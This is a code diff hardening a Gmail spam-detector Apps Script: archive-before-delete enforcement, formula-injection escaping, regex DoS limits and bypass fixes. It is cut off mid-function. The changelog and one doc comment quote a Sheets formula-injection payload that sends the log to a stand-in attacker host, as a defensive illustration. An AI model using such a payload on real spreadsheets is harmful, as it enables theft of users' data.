@@ -1,6 +1,6 @@
 /**
  * Gmail Spam Detector - Google Apps Script
- * @version 6.46.0
+ * @version 6.47.0
  *
  * Automated spam detection and destruction for Gmail. Runs on a 1-minute
  * trigger (a scheduled task), scanning the inbox for unprocessed emails and
@@ -19,7 +19,7 @@
  *   1. processInbox() — scan inbox, analyze each email, flag spam
  *   2. markAsSpam()   — report to Gmail (trains filters) + immediately delete by ID
  *      quarantineAsPhishing() — Rule 7 only: report + label, NO delete
- *   3. destroySpam()  — safety-net sweep of spam folder for stragglers
+ *   3. destroySpam()  — safety-net sweep of this detector's own verdicts
  *
  * Decision logic (7 rules, evaluated in priority order — first match wins):
  *   Rule 1: Bulk email + blacklisted sender domain → spam
@@ -32,6 +32,65 @@
  *           (QUARANTINED: archived + labelled, never deleted — see quarantineAsPhishing)
  *
  * Changelog (see git log for full history):
+ *   v6.47.0: Security hardening after an external review declined sign-off.
+ *            Six findings, all verified by running the shipped code.
+ *            (1) ARCHIVE-BEFORE-DELETE WAS NOT REAL. Four comments asserted it;
+ *            none were true. accumulateLogEntry() only buffered, and the Drive
+ *            write happened in flushSpamLog() AFTER the thread loop, so the
+ *            actual order was batchDelete then archive. A 6-minute timeout, an
+ *            unset SPAM_LOG_FOLDER_ID, a memory kill or a throw from
+ *            maintenance each destroyed mail with no copy, and the buffer is
+ *            cleared in a finally so nothing carried over. The recovery story
+ *            the v6.44.0 post-mortem relied on did not exist. New
+ *            archiveRawEml() writes the EML synchronously and reports success;
+ *            disposeDetectedMessage() now REFUSES the destructive branch
+ *            without it and holds the message for review instead. The
+ *            invariant is enforced in code and asserted in tests rather than
+ *            described in comments.
+ *            (2) SHEETS FORMULA INJECTION. setValues() evaluates formulas — the
+ *            code depends on that for its =HYPERLINK column — and the Subject,
+ *            display name, address and Reply-To were written raw. A subject of
+ *            =IMPORTXML("https://attacker/?x="&ENCODEURL(JOIN(",",A2:R500)))
+ *            fires on document open in the user's authenticated session and
+ *            exfiltrates the whole detection log. New escapeSheetCell()
+ *            apostrophe-prefixes anything starting with = + - @ tab or CR, and
+ *            caps cell length: an over-long subject used to make setValues()
+ *            throw, discarding the log rows for an entire batch of
+ *            already-deleted mail.
+ *            (3) QUADRATIC REGEX DoS. Fifteen patterns have the shape X.*Y,
+ *            which backtracks quadratically when X matches often. Measured: a
+ *            100KB subject of "Trump " cost 3.5s, and 200KB across
+ *            subject+from cost 14s — one email blowing the 6-minute budget,
+ *            killing the run before threads are labelled so the next trigger
+ *            repeats it forever, a self-sustaining denial of detection. The
+ *            100 000-char cap bounded nothing useful. Added maxSubjectChars
+ *            (2000) and maxFromChars (500). The ReDoS analysis comment was
+ *            wrong and said so confidently; corrected.
+ *            (4) OVERSIZE-BODY BYPASS. A body over maxEmailSizeBytes was
+ *            skipped unevaluated and then stamped SpamChecked, so padding the
+ *            HTML defeated all seven rules at zero cost and the message was
+ *            never reconsidered. Such threads are now flagged SuspectedSpam.
+ *            (5) WHITESPACE PLAIN PART. A text/plain body of one space is
+ *            truthy, so the HTML fallback never ran and Signals 2b, 2c and 2d
+ *            all saw an empty body. One space disabled every body signal.
+ *            Fixed with .trim().
+ *            (6) cleanseInbox() still had the substring whitelist/blacklist
+ *            matcher that v6.42.0 fixed in collectSignals() only — and matched
+ *            the DISPLAY NAME, so "Dragonfly Capital" was whitelisted and
+ *            "FinanceBuzz Weekly" from a legitimate domain was permanently
+ *            deleted, with no archive at all. It hand-rolled the pipeline and
+ *            then called analyzeMessage() anyway; the duplicate is deleted and
+ *            it now shares one code path.
+ *            Also: isBulkEmail() scans the first 64KB rather than lowercasing
+ *            a 25MB message; checkFalseNegatives() gained the result cap every
+ *            other search already had, and honours the archive invariant;
+ *            removed dead refreshWhitelist/refreshBlacklist (77 lines, obsolete
+ *            since v6.35.0) and the dead phishing-label block in destroySpam();
+ *            corrected four factually wrong comments; scripts/validate.py is
+ *            wired into CI and its broken README-tag check replaced with an
+ *            @version/SCRIPT_VERSION agreement check; CI path filters now
+ *            include scripts/, .claspignore and docs/ — the files that broke
+ *            four deploys did not trigger the workflow.
  *   v6.46.0: Scope the spam sweep to this detector's own verdicts. destroySpam()
  *            deleted the ENTIRE Spam folder every few minutes — including mail
  *            Gmail's classifier filed, which this script never evaluated. That
@@ -200,7 +259,7 @@
  *            "VIEW IN DOCUSIGN" pointing at cptlbpolicy.com.
  *            Added: (1) Signal 7 / Rule 7 — hasBrandMismatchedCta() fires when
  *            anchor text names a BRAND_CTA_DOMAINS key, carries a CTA verb and
- *            is <=60 chars (a button label, not prose), while the href host
+ *            normalizes to <=80 chars (a button label, not prose), while the href host
  *            belongs to neither that brand, a known link wrapper, nor the
  *            sender. Not gated on bulk — this class also arrives via
  *            compromised accounts, the same reasoning Rule 6 accepted.
@@ -397,7 +456,7 @@
  *
  * @const {string}
  */
-const SCRIPT_VERSION = '6.46.0';
+const SCRIPT_VERSION = '6.47.0';
 
 const CONFIG = Object.freeze({
   /** Max emails per run — prevents Apps Script 6-minute execution timeout */
@@ -504,6 +563,26 @@ const LIMITS = Object.freeze({
   /** Max anchors examined per message. Calls-to-action appear early; a document
    *  with 300+ links is a directory dump, not a lure. Bounds the exec() loop. */
   maxAnchorsScanned: 300,
+
+  /** Max characters written to a single Google Sheets cell. Sheets' own limit
+   *  is 50 000 and exceeding it makes setValues() throw, which discarded the
+   *  log rows for an entire batch — all of which were already deleted. */
+  maxSheetCellChars: 5000,
+
+  /** Subject/From truncation for PATTERN MATCHING.
+   *  maxInputChars (100 000) is three orders of magnitude larger than any real
+   *  subject, and several patterns have the shape X.*Y, which is QUADRATIC when
+   *  X matches at many positions. A 100KB subject of "Trump " measured 3.5s
+   *  across the pattern set, and 200KB across subject+from measured 14s — one
+   *  email exceeding the 6-minute budget, which kills the run, leaves the
+   *  threads unlabelled, and makes the next trigger repeat it forever. */
+  maxSubjectChars: 2000,
+  maxFromChars: 500,
+
+  /** Max characters of raw RFC822 scanned for bulk-sender fingerprints. All
+   *  fingerprints live in headers, so scanning the whole message (which can be
+   *  25MB with attachments) only allocated a second copy of it. */
+  maxRawScanChars: 65536,
 
   /** Max characters of inner text read per anchor before giving up on </a>.
    *  Without this an unclosed <a> would scan to end-of-document, and N unclosed
@@ -1072,6 +1151,16 @@ function processInbox()
           // sweep indefinitely.
           if (!result.destroyed)
           {
+            // An unevaluated message still gets SpamChecked (otherwise every
+            // run re-fetches it), but is also flagged so it is not silently
+            // indistinguishable from mail that passed all seven rules.
+            if (result.unevaluated)
+            {
+              try { thread.addLabel(getOrCreateLabel('SuspectedSpam')); }
+              catch (e) { logError('Could not flag unevaluated thread: ' + e.toString()); }
+              logInfo('FLAGGED (too large to evaluate): ' +
+                      sanitizeForLog(thread.getFirstMessageSubject()));
+            }
             thread.addLabel(label);
           }
         }
@@ -1134,6 +1223,7 @@ function cleanseInbox()
   const SUSPECT_LABEL = 'SuspectedSpam';
 
   let deletedCount  = 0;
+  let phishingCount = 0;
   let suspectCount  = 0;
   let cleanCount    = 0;
   let errorCount    = 0;
@@ -1142,9 +1232,6 @@ function cleanseInbox()
   {
     const checkedLabel = getOrCreateLabel(CONFIG.processedLabel);
     const suspectLabel = getOrCreateLabel(SUSPECT_LABEL);
-    const blacklist    = getBlacklist();  // DEFAULT_DOMAINS + user-added, merged automatically
-    const whitelist    = getWhitelist();
-
     const query = '{in:inbox category:updates category:promotions category:social category:forums}' +
                   ' -label:' + CONFIG.processedLabel;
 
@@ -1165,45 +1252,64 @@ function cleanseInbox()
           const messages = thread.getMessages();
           let threadDeleted  = false;
           let threadSuspect  = false;
+          let threadHandled  = false;
 
           for (let m = 0; m < messages.length; m++)
           {
-            const message  = messages[m];
-            const fromLower = sanitizeInput(message.getFrom()).toLowerCase();
+            const message = messages[m];
 
-            // Whitelist: skip entirely
-            let whitelisted = false;
-            for (let w = 0; w < whitelist.length; w++)
-            {
-              if (fromLower.includes(whitelist[w])) { whitelisted = true; break; }
-            }
-            if (whitelisted) continue;
+            // Single call to the real pipeline. This function used to re-implement
+            // the whitelist check, bulk detection and blacklist check by hand and
+            // then call analyzeMessage() two lines later anyway — duplicating even
+            // the expensive getRawContent().
+            //
+            // That duplication was not just waste, it was a live security hole.
+            // The hand-rolled copy matched with `fromLower.includes(entry)` against
+            // the FULL From string, display name included, so:
+            //   "billing@linkedin.com" <evil@evil.ru>    -> whitelisted, skipped
+            //   "financebuzz roundup" <legit@company.com> -> blacklisted -> DELETED
+            // v6.42.0 fixed both bugs in collectSignals() and this copy was missed,
+            // so the delete path here kept the old behaviour for three releases.
+            // Deleting the duplicate is the fix; sharing one code path is what stops
+            // it recurring.
+            const verdict = analyzeMessage(message);
+            if (verdict.signals === null) continue;  // whitelisted
+            if (!verdict.isSpam) continue;
 
-            // Rule 1 pre-check: bulk + blacklisted = definitive, delete immediately
-            const rawContent = message.getRawContent();
-            const isBulk     = isBulkEmail(rawContent);
-            let isBlacklisted = false;
-            for (let b = 0; b < blacklist.length; b++)
+            const firedRule = getRuleFromSignals(verdict.signals).rule;
+
+            // Rule 1 (bulk + known spam mill) is definitive, so cleanse mode acts
+            // on it. Rule 7 routes through the same disposition logic as the live
+            // pipeline so a brand-mismatched CTA is quarantined here too, rather
+            // than silently downgraded to a SuspectedSpam label.
+            if (firedRule === 'Rule 1' || firedRule === 'Rule 7')
             {
-              if (fromLower.includes(blacklist[b])) { isBlacklisted = true; break; }
+              // Archive BEFORE disposing — getRawContent() is unavailable after a
+              // batchDelete. cleanse mode previously deleted with no Drive EML and
+              // no Sheets row at all, so a misjudged message left no trace.
+              const archived = accumulateLogEntry(message, verdict.signals,
+                firedRule === 'Rule 7' ? 'PHISHING_DETECTED' : 'SPAM_DETECTED');
+
+              if (disposeDetectedMessage(message, thread, verdict.signals, archived))
+              {
+                deletedCount++;
+                threadDeleted = true;
+              }
+              else
+              {
+                phishingCount++;
+                threadHandled = true;   // quarantined: archived + Phishing label
+              }
+              break; // this message is handled; stop scanning the thread
             }
 
-            if (isBulk && isBlacklisted)
-            {
-              markAsSpam(message, thread);
-              deletedCount++;
-              threadDeleted = true;
-              break; // Thread is gone — stop processing its messages
-            }
-
-            // Rules 2-5: pattern-based — quarantine for human review
-            if (analyzeMessage(message).isSpam)
-            {
-              threadSuspect = true;
-            }
+            // Rules 2-6: pattern-based — label for human review, never delete
+            threadSuspect = true;
           }
 
-          if (threadDeleted) continue;
+          // Deleted or quarantined: disposition already applied the labels it
+          // needs, and addLabel() throws on a destroyed thread.
+          if (threadDeleted || threadHandled) continue;
 
           if (threadSuspect)
           {
@@ -1232,8 +1338,14 @@ function cleanseInbox()
     }
 
     logInfo('CLEANSE COMPLETE: ' + deletedCount + ' deleted (Rule 1), ' +
-            suspectCount + ' quarantined (review SuspectedSpam label), ' +
+            phishingCount + ' quarantined (Phishing label), ' +
+            suspectCount + ' flagged (review SuspectedSpam label), ' +
             cleanCount + ' clean, ' + errorCount + ' errors');
+
+    // Flush the archive buffer before the sweep. accumulateLogEntry() only
+    // buffers; without this the Drive EMLs and Sheets rows for everything
+    // deleted above are discarded.
+    flushSpamLog();
 
     destroySpam();
   }
@@ -1281,20 +1393,6 @@ function destroySpam()
     logError('Cannot resolve the purge label — skipping the spam sweep rather ' +
              'than risk deleting mail this detector never judged');
     return;
-  }
-
-  // Ensure the phishing label exists before referencing it in the query below.
-  // A Gmail search naming a label that has never been created is not
-  // guaranteed to be treated as a harmless no-op, and if it errored here the
-  // spam-folder sweep would stop running entirely. Creating it up front makes
-  // the query valid on a fresh install where no phishing has been caught yet.
-  try
-  {
-    getOrCreateLabel(CONFIG.phishingLabel);
-  }
-  catch (labelError)
-  {
-    logError('Could not ensure phishing label exists: ' + labelError.toString());
   }
 
   let destroyed = 0;
@@ -1375,7 +1473,7 @@ function destroySpam()
 
   if (iterations >= MAX_ITERATIONS)
   {
-    logInfo('Destroy hit max iterations (' + MAX_ITERATIONS + ') - spam folder may still have messages');
+    logInfo('Destroy hit max iterations (' + MAX_ITERATIONS + ') - tagged messages may remain');
   }
 
   if (destroyed > 0)
@@ -1416,6 +1514,9 @@ function processThread(thread, messages)
   // spamCount but leaves the thread ALIVE, so callers must not infer
   // "thread is gone" from spamCount > 0.
   let threadDestroyed = false;
+  // Set when a message was skipped without being evaluated (oversize). The
+  // caller flags such threads rather than marking them clean.
+  let threadUnevaluated = false;
 
   // Process all messages in the thread
   for (let i = 0; i < messages.length; i++)
@@ -1427,6 +1528,13 @@ function processThread(thread, messages)
       // Skip oversized emails (> 5MB) to prevent memory issues
       if (!shouldProcessMessage(message))
       {
+        // NOT silently passed. Skipping an oversize message and then letting
+        // processInbox() stamp SpamChecked was a total detector bypass for the
+        // price of padding the HTML body past CONFIG.maxEmailSizeBytes: the
+        // message was never evaluated by any rule and never reconsidered.
+        // Flagging the thread makes an unevaluated message visible instead of
+        // indistinguishable from a clean one.
+        threadUnevaluated = true;
         continue;
       }
 
@@ -1446,11 +1554,13 @@ function processThread(thread, messages)
         const detectionLogType = verdict.signals &&
           (verdict.signals.serviceImpersonation || verdict.signals.brandMismatchedCta)
           ? 'PHISHING_DETECTED' : 'SPAM_DETECTED';
-        accumulateLogEntry(message, verdict.signals, detectionLogType);
+        // Capture whether the raw message actually reached Drive — the
+        // destructive branch is gated on it.
+        const archived = accumulateLogEntry(message, verdict.signals, detectionLogType);
 
         // Rule 7 (brand-mismatched CTA) quarantines rather than destroys — see
         // quarantineAsPhishing(). Every other rule deletes permanently.
-        threadDestroyed = disposeDetectedMessage(message, thread, verdict.signals);
+        threadDestroyed = disposeDetectedMessage(message, thread, verdict.signals, archived);
         logDebug('SPAM DETECTED: ' + sanitizeForLog(message.getSubject()));
 
         spamCount++;
@@ -1465,7 +1575,7 @@ function processThread(thread, messages)
   }
 
   return { spamCount: spamCount, processedCount: processedCount,
-           destroyed: threadDestroyed };
+           destroyed: threadDestroyed, unevaluated: threadUnevaluated };
 }
 
 /**
@@ -1541,7 +1651,12 @@ function buildSearchQuery()
  */
 function isBulkEmail(rawContent)
 {
-  const lower = rawContent.toLowerCase();
+  // Scan only the head of the message. Every fingerprint lives in a header, and
+  // rawContent can be 25MB when a large attachment is present — lowercasing all
+  // of it allocated a second full copy for no detection benefit.
+  const lower = String(rawContent || '')
+    .substring(0, LIMITS.maxRawScanChars)
+    .toLowerCase();
   return BULK_EMAIL_FINGERPRINTS.some(function(fingerprint) {
     return lower.includes(fingerprint);
   });
@@ -1578,11 +1693,14 @@ function collectSignals(message)
   // getFrom() is cheap (metadata from cached search results). getRawContent()
   // is an expensive separate HTTP download of the full RFC 822 message.
   // Checking the whitelist immediately means whitelisted senders (LinkedIn,
-  // GitHub, Stripe, etc.) never trigger a raw message download.
+  // Substack, Meetup, etc. — DEFAULT_DOMAINS.legitimate is the real list;
+  // GitHub/Stripe/banks are NOT in it) never trigger a raw message download.
   // IMPORTANT: match against the extracted email address only, not the full
   // From string — prevents display-name spoofing such as:
   //   "LinkedIn News <spammer@spam.com>" bypassing the whitelist check.
-  const from = sanitizeInput(message.getFrom()).replace(RFC2822_QUOTED_NAME, '$1$2');
+  const from = sanitizeInput(message.getFrom())
+    .substring(0, LIMITS.maxFromChars)
+    .replace(RFC2822_QUOTED_NAME, '$1$2');
   const senderAddress = extractEmailAddress(from);
 
   const whitelist = getCachedWhitelist();
@@ -1601,7 +1719,9 @@ function collectSignals(message)
   }
 
   // ── Extract remaining fields (only reached for non-whitelisted senders) ─
-  const subject = sanitizeInput(message.getSubject());
+  // Truncated hard for pattern matching — see LIMITS.maxSubjectChars for the
+  // quadratic-regex measurements that motivate it.
+  const subject = sanitizeInput(message.getSubject()).substring(0, LIMITS.maxSubjectChars);
   // Fall back to HTML-stripped body if plain body is empty (HTML-only emails).
   // Without this fallback, BODY_CRYPTO_PATTERNS would silently never fire on
   // messages that have no text/plain part.
@@ -1618,7 +1738,10 @@ function collectSignals(message)
   // the *result* of stripHtmlTags(), so the two regex passes ran across up to
   // 5 MB (the shouldProcessMessage ceiling) and allocated two 5 MB
   // intermediates on every HTML-only message.
-  const body = sanitizeInput(plainBody) || stripHtmlTags(html);
+  // .trim() matters: a text/plain part containing a single space is truthy,
+  // so the HTML fallback never ran and Signals 2b/2c/2d all saw an empty
+  // body. One space in the plain part disabled every body-based signal.
+  const body = sanitizeInput(plainBody).trim() || stripHtmlTags(html);
   const rawContent = message.getRawContent(); // Full RFC 822 content (includes all headers)
 
   // ── Initialize signal accumulators ───────────────────────────────────────
@@ -1947,7 +2070,8 @@ function makeVerdict(signals)
  * false before any signal collection occurs.
  *
  * @param {GmailMessage} message - The Gmail message to analyze.
- * @return {boolean} true if spam, false if not.
+ * @return {Object} {isSpam: boolean, signals: Object|null}. `signals` is null
+ *                  when the sender is whitelisted or signal collection threw.
  */
 function analyzeMessage(message)
 {
@@ -2003,8 +2127,13 @@ function analyzeMessage(message)
  * @param {GmailMessage} message - The message to dispose of.
  * @param {GmailThread}  thread  - Its thread.
  * @param {Object|null}  signals - Signal object from collectSignals().
+ * @param {boolean} archived - Whether archiveRawEml() stored the raw message.
+ *                  A destructive rule with archived !== true is downgraded to a
+ *                  quarantine: deleting the only copy of a message we could not
+ *                  back up is never the right answer.
+ * @return {boolean} true if the thread was destroyed and must not be touched again.
  */
-function disposeDetectedMessage(message, thread, signals)
+function disposeDetectedMessage(message, thread, signals, archived)
 {
   const rule = getRuleFromSignals(signals).rule;
 
@@ -2020,6 +2149,23 @@ function disposeDetectedMessage(message, thread, signals)
 
   if (DESTRUCTIVE_RULES.indexOf(rule) !== -1)
   {
+    // The archive invariant, ENFORCED rather than documented.
+    //
+    // Four comments in this file used to assert "archived before deleting" and
+    // none of them were true: accumulateLogEntry() buffered, and the Drive
+    // write happened after the thread loop, so the real order was delete-then-
+    // archive. Any interruption in between lost the only copy. archiveRawEml()
+    // now writes synchronously and reports success, and this is the gate that
+    // makes it matter: a message with no archive is never permanently deleted.
+    if (archived !== true)
+    {
+      logError('REFUSING to permanently delete (no Drive archive): ' +
+               sanitizeForLog(message.getSubject()) + ' — quarantining instead. ' +
+               'Run setupLogging() if this persists.');
+      quarantineUnarchived(message, thread);
+      return false;
+    }
+
     markAsSpam(message, thread);
     return true;  // thread destroyed — caller must not touch it again
   }
@@ -2032,6 +2178,32 @@ function disposeDetectedMessage(message, thread, signals)
 
   quarantineAsPhishing(message, thread);
   return false;   // thread still exists
+}
+
+/**
+ * Hold a message that a destructive rule matched but which could not be
+ * archived.
+ *
+ * Deliberately does NOT use the Phishing label — the rule that fired was a
+ * spam rule, not Rule 7, and mislabelling it would corrupt both the user's
+ * mental model and the training log. Leaves the message in place, flagged for
+ * review, so the next run can retry once the archive is reachable again.
+ *
+ * @param {GmailMessage} message
+ * @param {GmailThread}  thread
+ */
+function quarantineUnarchived(message, thread)
+{
+  try
+  {
+    const label = getOrCreateLabel('SuspectedSpam');
+    if (label) thread.addLabel(label);
+    logInfo('HELD FOR REVIEW (unarchivable): ' + sanitizeForLog(message.getSubject()));
+  }
+  catch (e)
+  {
+    logError('Could not flag unarchived message for review: ' + e.toString());
+  }
 }
 
 /**
@@ -2618,14 +2790,16 @@ function isLinkWrapperHost(host, senderHost)
  *   /<a[^>]*>([\s\S]*?)<\/a>/g
  * is polynomial in (anchor count x document length) on attacker-controlled
  * input: every <a> with no closing </a> makes the engine scan to
- * end-of-document before failing, so 800 unclosed anchors in a 4 MB body costs
+ * end-of-document before failing, so 900 unclosed anchors in a 4 MB body costs
  * ~3e9 character steps — tens of seconds inside a 6-minute total budget. Mail
  * clients tolerate unclosed anchors, so this is trivially reachable.
  *
  * Instead: one BOUNDED regex for the open tag, then String.indexOf() for the
- * close. indexOf is a native linear scan with no backtracking, and the window
- * it searches is capped by LIMITS.maxAnchorTextChars. Every quantifier below
- * is explicitly bounded, so a malformed tag cannot walk the document.
+ * close. indexOf is a native linear scan with no backtracking. It does scan to
+ * end-of-document; maxAnchorTextChars caps the substring we KEEP, not the
+ * search, so the real bound is maxAnchorsScanned x maxHtmlScanChars — measured
+ * at ~9ms worst case. Every quantifier below is explicitly bounded too, so a
+ * malformed tag missing its '>' cannot walk the document.
  *
  * @param {string} html - Decoded HTML body from message.getBody().
  * @return {Array<Object>} At most LIMITS.maxAnchorsScanned objects with
@@ -2686,7 +2860,9 @@ function extractAnchors(html)
  *
  * All four conditions must hold for an anchor to fire:
  *   1. normalized link text contains a BRAND_CTA_DOMAINS key, carries a
- *      CTA verb, and is <= 60 chars (a button label, not prose)
+ *      CTA verb, and its NORMALIZED text is <= 80 chars (a button label,
+ *      not prose) — measured after stripping non-alphanumerics, so padding
+ *      with zero-width characters cannot inflate it past the bound
  *   2. href resolves to an http(s) host
  *   3. that host matches none of the brand's legitimate domains
  *   4. that host is not a link wrapper, and is not aligned with the sender's
@@ -3166,80 +3342,15 @@ function viewBlacklist()
 }
 
 /**
- * Refresh whitelist by adding any missing default domains.
+ * refreshWhitelist() and refreshBlacklist() were removed in v6.47.0.
  *
- * Run this after updating DEFAULT_DOMAINS.legitimate in the source code.
- * It merges new defaults into the existing list without removing any
- * manually-added domains.
+ * They existed when Script Properties were the only source of the domain lists
+ * and had to be re-seeded after a source edit. Since v6.35.0 getWhitelist() and
+ * getBlacklist() merge DEFAULT_DOMAINS at runtime, so source edits are live as
+ * soon as clasp pushes and there is nothing to refresh. Nothing called them for
+ * twelve releases, and three separate comments already described them as
+ * obsolete.
  */
-function refreshWhitelist()
-{
-  const props = PropertiesService.getScriptProperties();
-  const currentWhitelist = getWhitelist();
-  const defaults = DEFAULT_DOMAINS.legitimate;
-  let addedCount = 0;
-
-  // Add any defaults that aren't already in the list
-  for (let i = 0; i < defaults.length; i++)
-  {
-    if (!currentWhitelist.includes(defaults[i]))
-    {
-      currentWhitelist.push(defaults[i]);
-      logInfo('Added missing domain: ' + defaults[i]);
-      addedCount++;
-    }
-  }
-
-  if (addedCount > 0)
-  {
-    props.setProperty('LEGITIMATE_DOMAINS', JSON.stringify(currentWhitelist));
-    logInfo('Whitelist refreshed! Added ' + addedCount + ' new domains.');
-  }
-  else
-  {
-    logInfo('Whitelist already up to date.');
-  }
-
-  viewWhitelist();
-}
-
-/**
- * Refresh blacklist by adding any missing default domains.
- *
- * Run this after updating DEFAULT_DOMAINS.suspicious in the source code.
- * It merges new defaults into the existing list without removing any
- * manually-added domains.
- */
-function refreshBlacklist()
-{
-  const props = PropertiesService.getScriptProperties();
-  const currentBlacklist = getBlacklist();
-  const defaults = DEFAULT_DOMAINS.suspicious;
-  let addedCount = 0;
-
-  // Add any defaults that aren't already in the list
-  for (let i = 0; i < defaults.length; i++)
-  {
-    if (!currentBlacklist.includes(defaults[i]))
-    {
-      currentBlacklist.push(defaults[i]);
-      logInfo('Added missing domain: ' + defaults[i]);
-      addedCount++;
-    }
-  }
-
-  if (addedCount > 0)
-  {
-    props.setProperty('SUSPICIOUS_DOMAINS', JSON.stringify(currentBlacklist));
-    logInfo('Blacklist refreshed! Added ' + addedCount + ' new domains.');
-  }
-  else
-  {
-    logInfo('Blacklist already up to date.');
-  }
-
-  viewBlacklist();
-}
 
 
 // =============================================================================
@@ -3445,7 +3556,7 @@ function runPeriodicMaintenance()
             SCRIPT_VERSION + ') — forcing immediate maintenance cycle');
     // Recorded BEFORE running the cycle, deliberately. If one of the
     // maintenance functions throws, the next 1-minute trigger must fall back
-    // to the normal 15-minute gate rather than force a fresh cycle every
+    // to the normal maintenance gate rather than force a fresh cycle every
     // minute and burn Gmail API quota.
     props.setProperty('LAST_SEEN_VERSION', SCRIPT_VERSION);
   }
@@ -3490,7 +3601,7 @@ function checkFalseNegatives()
 {
   try
   {
-    const threads = GmailApp.search('label:' + SPAM_MISSED_LABEL);
+    const threads = GmailApp.search('label:' + SPAM_MISSED_LABEL, 0, CONFIG.maxEmailsPerRun);
     if (threads.length === 0) return;
 
     logInfo('Found ' + threads.length + ' false negative(s) to log');
@@ -3514,7 +3625,7 @@ function checkFalseNegatives()
         catch (e) { /* non-fatal — log entry still captured without signals */ }
 
         // Accumulate BEFORE deletion — getRawContent() is unavailable after batchDelete
-        accumulateLogEntry(message, signals, 'FALSE_NEGATIVE');
+        const archived = accumulateLogEntry(message, signals, 'FALSE_NEGATIVE');
 
         // Remove label before markAsSpam() — deleted threads can't have labels removed
         if (label) thread.removeLabel(label);
@@ -3523,6 +3634,17 @@ function checkFalseNegatives()
         // this code means the user manually applied the "SpamMissed" label,
         // which is an explicit instruction to destroy. Quarantining here would
         // override a human decision.
+        //
+        // The archive invariant still applies though — an explicit instruction
+        // to delete is not an instruction to delete the only copy.
+        if (!archived)
+        {
+          logError('REFUSING to delete SpamMissed message (no Drive archive): ' +
+                   sanitizeForLog(message.getSubject()) + ' — left in place, ' +
+                   'will retry next run. Run setupLogging() if this persists.');
+          continue;
+        }
+
         markAsSpam(message, thread);
 
         logInfo('FALSE NEGATIVE LOGGED AND DESTROYED: ' + sanitizeForLog(message.getSubject()));
@@ -3591,11 +3713,11 @@ function recheckRecentSpamChecked()
         logInfo('Auto-recaught false negative: ' + sanitizeForLog(message.getSubject()));
 
         // Accumulate log entry BEFORE deletion — getRawContent() unavailable after batchDelete
-        accumulateLogEntry(message, verdict.signals, 'FALSE_NEGATIVE');
+        const archived = accumulateLogEntry(message, verdict.signals, 'FALSE_NEGATIVE');
         // Same destroy-vs-quarantine routing as processThread(). An
         // auto-recaught Rule 7 hit must not be permanently deleted just
         // because it was found on the recheck pass rather than the first one.
-        disposeDetectedMessage(message, thread, verdict.signals);
+        disposeDetectedMessage(message, thread, verdict.signals, archived);
         recaughtCount++;
       }
       catch (threadError)
@@ -3629,6 +3751,41 @@ function recheckRecentSpamChecked()
  * @param {Object|null}  signals - Signal object from collectSignals(), or null.
  * @param {string}       logType - 'SPAM_DETECTED', 'PHISHING_DETECTED', or 'FALSE_NEGATIVE'.
  */
+/**
+ * Make an attacker-controlled value safe to hand to Range.setValues().
+ *
+ * setValues() EVALUATES formulas — this code relies on that for the
+ * =HYPERLINK() in the Drive URL column. So a Subject, display name, address or
+ * Reply-To beginning with '=', '+', '-', '@', tab or CR becomes a LIVE FORMULA
+ * in the user's own authenticated Sheets session. A subject of
+ *   =IMPORTXML("https://attacker/?x="&ENCODEURL(JOIN(",",A2:R500)),"//a")
+ * fires on document open with no interaction and exfiltrates the entire
+ * detection log — every sender, subject, message id and Drive EML URL.
+ * The attacker fully controls whether their own mail is flagged, so getting
+ * the row written is trivial.
+ *
+ * Prefixing an apostrophe forces Sheets to treat the cell as literal text.
+ * Also length-capped: a subject exceeding the 50 000-character cell limit made
+ * setValues() throw, and because flushSpamLog()'s finally clears the buffer,
+ * one crafted subject destroyed the log rows for every message in that batch —
+ * all of which were already deleted.
+ *
+ * @param {*} value - Raw, attacker-influenced value.
+ * @return {string} A value that cannot be interpreted as a formula.
+ */
+function escapeSheetCell(value)
+{
+  if (value === null || value === undefined) return '';
+
+  let text = String(value);
+  if (text.length > LIMITS.maxSheetCellChars)
+  {
+    text = text.substring(0, LIMITS.maxSheetCellChars) + '...[truncated]';
+  }
+
+  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text;
+}
+
 function accumulateLogEntry(message, signals, logType)
 {
   try
@@ -3652,7 +3809,25 @@ function accumulateLogEntry(message, signals, logType)
     try { rawContent = message.getRawContent(); }
     catch (e) { logError('getRawContent failed for ' + message.getId() + ': ' + e.toString()); }
 
+    // Write the EML to Drive NOW, synchronously, before the caller disposes of
+    // the message.
+    //
+    // This used to only buffer, with the Drive write happening in
+    // flushSpamLog() after the whole thread loop — so the real order was
+    // batchDelete THEN Drive write, and the "archived before deleting"
+    // guarantee that the v6.44.0 post-mortem relied on did not exist. Anything
+    // ending the execution in between lost the archive permanently, and
+    // flushSpamLog()'s finally clears the buffer so there was no carry-over:
+    // a 6-minute timeout, an unset SPAM_LOG_FOLDER_ID, a memory kill, or a
+    // throw from runPeriodicMaintenance() each deleted mail with no copy.
+    //
+    // The returned value is the invariant disposeDetectedMessage() enforces:
+    // no archive, no permanent delete.
+    const archive = archiveRawEml(message.getId(), rawContent, logType);
+
     _pendingLogEntries.push({
+      driveUrl:               archive.driveUrl,
+      archived:               archive.archived,
       detectedAt:             new Date().toISOString(),
       logType:                logType,
       messageId:              message.getId(),
@@ -3670,11 +3845,68 @@ function accumulateLogEntry(message, signals, logType)
       hasAttachment:          hasAttachment,
       listUnsubscribePresent: listUnsubscribePresent
     });
+
+    return archive.archived;
   }
   catch (error)
   {
     logError('accumulateLogEntry failed: ' + error.toString());
+    return false;
   }
+}
+
+/**
+ * Write one raw message to the Drive archive immediately.
+ *
+ * Split out of flushSpamLog() so the archive can be written BEFORE disposal
+ * rather than after. Only the Sheets row remains batched — that is where the
+ * batching win actually is, and a lost Sheets row is recoverable from the EML
+ * whereas a lost EML is not recoverable from anything.
+ *
+ * @param {string} messageId  - Gmail message id, used for the filename.
+ * @param {string} rawContent - Full RFC822 content.
+ * @param {string} logType    - Routes FALSE_NEGATIVE to its own subfolder.
+ * @return {Object} {archived: boolean, driveUrl: string}
+ */
+function archiveRawEml(messageId, rawContent, logType)
+{
+  const result = { archived: false, driveUrl: '' };
+
+  if (!rawContent)
+  {
+    logError('No raw content to archive for ' + messageId);
+    return result;
+  }
+
+  try
+  {
+    const props   = PropertiesService.getScriptProperties();
+    const folderId = props.getProperty('SPAM_LOG_FOLDER_ID');
+    if (!folderId)
+    {
+      logError('SPAM_LOG_FOLDER_ID unset — run setupLogging(). Nothing will be ' +
+               'permanently deleted until the archive is reachable.');
+      return result;
+    }
+
+    const rootFolder = DriveApp.getFolderById(folderId);
+    const subfolder  = getOrCreateLogSubfolder(rootFolder,
